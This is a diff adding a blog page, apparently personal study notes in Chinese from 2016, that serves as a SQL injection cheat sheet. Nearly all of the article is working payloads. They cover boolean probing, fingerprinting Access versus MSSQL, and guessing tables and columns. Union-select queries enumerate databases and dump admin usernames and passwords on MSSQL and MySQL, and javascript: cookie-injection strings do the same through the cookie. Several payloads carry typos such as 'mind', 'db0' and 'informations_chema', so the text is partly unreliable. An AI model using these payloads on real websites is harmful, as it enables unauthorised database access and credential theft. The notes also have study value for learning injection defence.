@@ -1,0 +1,247 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="google-site-verification" content="xyaFwSI1VZa80BtZHe7okdwZ9tuTs-lYAAuDt1bsCxM" />
+  
+  <title>Review of Network Attack and Defense</title>
+  <meta name="author" content="gaoryrt">
+   <meta name="description" content="记录gaoryrt的学习和生活">
+  
+
+  <meta property="og:title" content="Review of Network Attack and Defense"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:site_name" content="Blog Name Goes Here"/>
+ <meta property="og:image" content="undefined"/>
+  
+  <link href="/apple-touch-icon-precomposed.png" sizes="180x180" rel="apple-touch-icon-precomposed">
+  <link rel="alternate" href="/atom.xml" title="Blog Name Goes Here" type="application/atom+xml">
+  <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.6/css/bootstrap.min.css">
+  <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/css/m.min.css">
+  <link rel="icon" type="image/x-icon" href="/favicon.ico">
+</head>
+
+<body>
+  <div id="main">
+    <div class="behind">
+      <div class="back">
+        <a href="/" class="black-color"><i class="fa fa-times" aria-hidden="true"></i></a>
+      </div>
+      <div class="description">
+        &nbsp;自由、平等、公正、法治
+      </div>
+    </div>
+    <div class="container">
+      
+
+  <article class="standard post">
+    <div class="title">
+      
+  
+    <h1 class="page-title center">
+        Review of Network Attack and Defense
+    </h1>
+  
+
+
+    </div>
+    <div class="meta center">
+      
+<time datetime="2016-09-18T17:02:38.000Z">
+  <i class="fa fa-calendar"></i>&nbsp;
+  2016-09-19
+</time>
+
+
+
+    
+    &nbsp;
+    <i class="fa fa-tag"></i>&nbsp;
+    <a href="/categories/Discovery/">Discovery</a>
+
+
+
+
+
+    </div>
+    <hr>
+    <div class="picture-container">
+      
+    </div>
+    <p>SQL注入即是指攻击者通过在应用程序中预先定义好的查询语句结尾加上额外的SQL语句元素，欺骗数据库服务器执行非授权的任意查询。</p>
+<h2 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h2><h3 id="1-试探-1-1，1-2"><a href="#1-试探-1-1，1-2" class="headerlink" title="1.试探 1=1，1=2"></a>1.试探 1=1，1=2</h3><ol>
+<li><a href="http://example.asp?id=49" target="_blank" rel="external">http://example.asp?id=49</a></li>
+<li><a href="http://example.asp?id=49" target="_blank" rel="external">http://example.asp?id=49</a> <code>and 1=1</code></li>
+<li><a href="http://example.asp?id=49" target="_blank" rel="external">http://example.asp?id=49</a> <code>and 1=2</code></li>
+</ol>
+<p>可以注入的表现：</p>
+<ol>
+<li>正常显示</li>
+<li>正常显示</li>
+<li>提示BOF或EOF</li>
+</ol>
+<p>不可注入的表现：</p>
+<ol>
+<li>正常显示</li>
+<li>程序定义的错误提示或提示类型转换时出错。</li>
+<li>同上</li>
+</ol>
+<h3 id="2-判断数据库类型"><a href="#2-判断数据库类型" class="headerlink" title="2.判断数据库类型"></a>2.判断数据库类型</h3><h4 id="加单引号"><a href="#加单引号" class="headerlink" title="加单引号"></a>加单引号</h4><ol>
+<li>错误提示含有JET（JET是ACCESS数据库的数据库引擎）</li>
+<li>错误提示中含有OLEDB（OLEDB是SQL SERVER使用的数据库引擎）</li>
+</ol>
+<h4 id="and-user-gt-0"><a href="#and-user-gt-0" class="headerlink" title="and user &gt; 0"></a>and user &gt; 0</h4><p>SQL SERVER出错：将nvarchar值“abc”转换数据类型为int的列时发生语法错误；“abc”正是变量user的值。SQL SERVER中有一个内置变量user，变量类型为nvarchar。</p>
+<p>ACCESS的系统表[msysobjects]在web环境下读该表会提示“没有权限”；SQL SERVER的系统表[sysobjects]在web环境下不可正常读取。</p>
+<h4 id="and-select-count-from-sysobjects-gt-0"><a href="#and-select-count-from-sysobjects-gt-0" class="headerlink" title="and (select count (*) from sysobjects) &gt; 0"></a><code>and (select count (*) from sysobjects) &gt; 0</code></h4><p>SQL SERVER显示正常。ACCESS显示出错。</p>
+<h4 id="and-select-count-from-msysobjects-gt-0"><a href="#and-select-count-from-msysobjects-gt-0" class="headerlink" title="and (select count (*) from msysobjects) &gt; 0"></a><code>and (select count (*) from msysobjects) &gt; 0</code></h4><p>SQL SERVER显示正常。ACCESS显示没有权限。</p>
+<h3 id="3-猜表名"><a href="#3-猜表名" class="headerlink" title="3.猜表名"></a>3.猜表名</h3><p><code>and (select count (*) from admin) &gt;= 0</code><br>返回正常说明admin存在</p>
+<h3 id="4-猜字段"><a href="#4-猜字段" class="headerlink" title="4.猜字段"></a>4.猜字段</h3><p><code>and (select count (content) from admin) &gt;= 0</code><br>返回正常说明content字段存在</p>
+<p>常用的猜字段函数<br>ACCESS: asc(字符)    返回字符的ascii<br>MSSQL: unicode(字符)    同上<br>ACCESS: char(数字)    返回ascii的字符<br>MSSQL: nchar()同上<br>ACCESS: mid(字符串,N,L)    返回字符串从N个字符起，长度为L的子字符串<br>MSSQL: substring(字符串,N,L)    同上<br>ACCESS,MSSQL: abc(数字)    返回数字的绝对值（猜汉字使用）<br>ACCESS,MSSQL: A between B and C    判断A是否在B和C之间</p>
+<p>例<code>and (select asc(mind(password,1,1))from admin) &gt; 100</code><br>查询admin中password字段第1个字符串的ascii是否大于100</p>
+<p>例<code>select * from article where articleid = &#39;&#39; union select * from user where userid = 1</code><br>第一个select执行后返回结果<code>title</code> <code>content</code><br><code>select * from article where articleid = &#39;&#39;</code><br>第二个select执行后返回结果<code>username</code> <code>password</code><br><code>select * from user where userid = 1</code><br>整个select执行后返回结果<code>username</code> <code>password</code><br>如果前面查询为真，则同时返回两次查询的内容</p>
+<ol>
+<li>判断字段个数<code>order by</code></li>
+<li>查表名<code>and (select count (*) from admin) &gt;= 0</code></li>
+<li>猜测admin表的字段个数（假如有三个字段id,user,password）<code>union select 1,2,3,4,5,6,7,8,9,10,* from admin</code>返回错误，<code>union select 1,2,3,* from admin</code>返回正常</li>
+</ol>
+<p>inner join on: 指定返回两个表中匹配的行<br><code>select * from admin as a inner join admin as b on a.id = b.id</code>返回一个表中的两个内容</p>
+<p>上方<code>3</code>中没法显示admin中所有的字段信息，扩大显示范围，构造如下语句<code>and 1=2 union select 1,2,3,* from admin as a inner join admin as b on a.id = b.id</code></p>
+<p><code>select * from admin inner join admin1 on admin.id = admin1.id</code>返回两个表内容</p>
+<h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><ol>
+<li>判断字段个数<code>order by 13</code></li>
+<li>判断字段回显位<code>and 1=2 union all select 1,2,null,4,5,6,7,8,9,10,11,null,13</code></li>
+<li>数据库版本<code>and 1=2 union select 1,@@version,null,4,5,6,7,8,9,10,11,null,13</code></li>
+<li>当前数据库名<code>and 1=2 union all select 1,db_name(),null,4,5,6,7,8,9,10,11,null,13</code></li>
+<li>所有数据库名（通过更改dbid，7以上的是用户数据库）<code>and 1=2 union all select 1,name,null,4,5,6,7,8,9,10,11,null,13 from master.db0.sysdatabases where dbid = 7 --</code></li>
+<li>表名（更改top后的数字来查询）<code>and 1=2 union all select 1,name,null,4,5,6,7,8,9,10,11,null,13 from data.db0.sysobjects where xtype = CHAER(85) and name not in (select top 1 name from data.db0.sysobjects where xtype = CHAR(85))--</code></li>
+<li>字段对应id<code>and 1=2 union all select 1,id,null,4,5,6,7,8,9,10,11,null,13 from data.db0.sysobjects where xtype = CHAR(85) and name not in (select top 7 name from data.bd0.sysobjects where xtype = CHAR(85))--</code></li>
+<li>根据id查字段名<code>and 1=2 union all select 1,id,null,4,5,6,7,8,9,10,11,null,13 from data.db0.syscolumns where ID = 12345 and name not in (select top 1 name from data.db0.syscolumns where ID = 12345)--</code></li>
+</ol>
+<h2 id="ASSESS"><a href="#ASSESS" class="headerlink" title="ASSESS"></a>ASSESS</h2><ol>
+<li>试探<code>1=1</code> <code>1=2</code></li>
+<li>环境监测<code>and ord(mid(version(),1,1))&gt;51</code>正常则为mysql4以上版本，可以union查询<code>union select 1,version(),3</code></li>
+<li>确定字段数<code>order by 13</code></li>
+<li>判断精确字段<code>and 1=2 union select 1,2,3,4</code>正常返回在页面中</li>
+<li>爆数据库名<code>and 1=2 union select 1,user(),3,database()</code>正常返回在页面中</li>
+<li>爆表<code>and 1=2 union select 1,TABLE_NAME,3,4 from information_schema.tables where TABLE_SCHEMA = &#39;blah&#39;</code>结果返回在2字段</li>
+<li>爆字段<code>and 1=2 union select 1,COLUMN_NAME,3,4 from informations_chema.COLUMN where TABLE_NAME=&#39;users&#39;</code> <code>and 1=2 union select char(mid(COLUMN-NAME)),2,3,4 from information_schema.COLUMN where TABLE_NAME=&#39;users&#39;</code></li>
+<li>爆数据<code>and 1=2 union select 1,user,3,password form phptest.users</code></li>
+</ol>
+<h2 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h2><ol>
+<li>在原地址加单引号</li>
+<li>去掉id值，页面出错，构造cookie语句：<code>javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;30 and 1=1&quot;))</code>会弹窗</li>
+<li>关闭弹窗，去掉id访问，页面正常</li>
+<li>猜测字段<code>javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;30 order by 5&quot;))</code>点击确认，去掉id访问，页面正常则正常</li>
+<li>判断回显位<code>javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;30 union select 1,2,3,4 from admin&quot;))</code>点击确认，去掉id访问，页面正常则正常</li>
+<li>猜解user password字段<code>javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;30 union select 1,user,3,4 from admin&quot;))</code></li>
+</ol>
+
+
+  </article>
+
+
+
+<div id="disqus_thread"></div>
+<script>
+
+var disqus_config = function () {
+this.page.url = 'http://gaoryrt.com/2016/09-19-review-of-Network-attack-and-defense/index.html';
+this.page.identifier = undefined;
+};
+
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+
+s.src = '//gaoryrt.disqus.com/embed.js';
+
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<div class="busuanzi center">
+页阅读量:&nbsp;<span id="busuanzi_value_page_pv"></span>&nbsp;・&nbsp;
+站访问量:&nbsp;<span id="busuanzi_value_site_pv"></span>&nbsp;・&nbsp;
+站访客数:&nbsp;<span id="busuanzi_value_site_uv"></span>
+</div>
+
+
+
+    </div>
+  </div>
+  <footer class="page-footer"><div class="clearfix">
+</div>
+<div class="right-foot container">
+    <div class="firstrow">
+        <a href="#top" >
+        <i class="fa fa-arrow-right"></i>
+        </a>
+        © Gaoryrt 2015-2016
+    </div>
+    <div class="secondrow">
+        <a href="https://github.com/gaoryrt/hexo-theme-pln">
+        Theme Pln
+        </a>
+    </div>
+</div>
+<div class="clearfix">
+</div>
+</footer>
+  <script src="//cdn.bootcss.com/jquery/2.2.1/jquery.min.js"></script>
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+
+// comments below to disable loading animation
+function revealOnScroll() {
+  var scrolled = $(window).scrollTop();
+  $(".excerpt, .index-title, .index-meta, p").each(function() {
+    var current = $(this),
+      height = $(window).outerHeight(),
+      offsetTop = current.offset().top;
+    (scrolled + height + 50 > offsetTop) ? current.addClass("animation"):'';
+  });
+}
+$(window).on("scroll", revealOnScroll);
+$(document).ready(revealOnScroll)
+
+// disqus scripts
+
+var disqus_shortname = 'gaoryrt';
+(function(){
+  var dsq = document.createElement('script');
+  dsq.type = 'text/javascript';
+  dsq.async = true;
+  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+  (document.getElementsByTagName('body')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+}());
+
+
+// dropdown scripts
+$(".dropdown").click(function(event) {
+  var current = $(this);
+  event.stopPropagation();
+  $(current).children(".dropdown-content")[($(current).children(".dropdown-content").hasClass("open"))?'removeClass':'addClass']("open")
+});
+$(document).click(function(){
+    $(".dropdown-content").removeClass("open");
+})
+
+// back to top scripts
+$("a[href='#top']").click(function() {
+  $("html, body").animate({ scrollTop: 0 }, 500);
+  return false;
+});
+
+
+var path = "/search.xml";
+searchFunc(path, 'local-search-input', 'local-search-result');
+
+</script>
+
+</body>
+</html>
